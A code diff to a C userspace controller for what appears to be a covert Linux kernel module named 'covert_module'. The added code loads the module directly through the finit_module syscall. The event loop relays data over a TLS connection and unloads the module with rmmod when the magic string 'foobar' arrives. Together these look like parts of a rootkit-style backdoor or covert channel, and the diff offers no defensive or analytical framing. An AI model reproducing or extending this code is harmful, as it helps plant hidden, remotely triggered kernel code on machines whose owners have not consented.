@@ -12,6 +12,7 @@
 
 #include <asm/types.h>
 #include <assert.h>
+#include <fcntl.h>
 #include <limits.h>
 #include <linux/tcp.h>
 #include <netinet/ip.h>
@@ -32,6 +33,7 @@
 #include <sys/prctl.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
+#include <sys/syscall.h>
 #include <sys/types.h>
 #include <sys/un.h>
 #include <unistd.h>
@@ -62,6 +64,8 @@ int* inot_fd;
 int inot_epoll = -1;
 struct inot_watch* inot_wds;
 size_t* inot_watch_count;
+
+#define finit_module(fd, param_values, flags) syscall(__NR_finit_module, fd, param_values, flags)
 
 /*
  * function:
@@ -335,7 +339,8 @@ void epoll_event_loop(SSL* ssl) {
                         memmove(buffer + 1, buffer, size);
                         buffer[0] = 's';
                         SSL_write(ssl, buffer, size + 1);
-                    } else if (eventList[i].data.fd == conn_sock && memcmp(buffer, "foobar", 6) == 0) {
+                    } else if (eventList[i].data.fd == conn_sock
+                            && memcmp(buffer, "foobar", 6) == 0) {
                         //Kernel is telling userspace to unload the kernel module
                         //system("modprobe -rf covert_module");
                         system("rmmod covert_module");
@@ -576,6 +581,11 @@ int main(void) {
 
     inot_fd = wrapped_mmap(sizeof(int));
     *inot_fd = create_inotify_descriptor();
+
+    //Load module from userspace
+    int module = open("covert_module.ko", O_RDONLY);
+    finit_module(module, "\0", 0);
+    close(module);
 
     conn_sock = accept(local_tls_socket, NULL, 0);
     fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK);
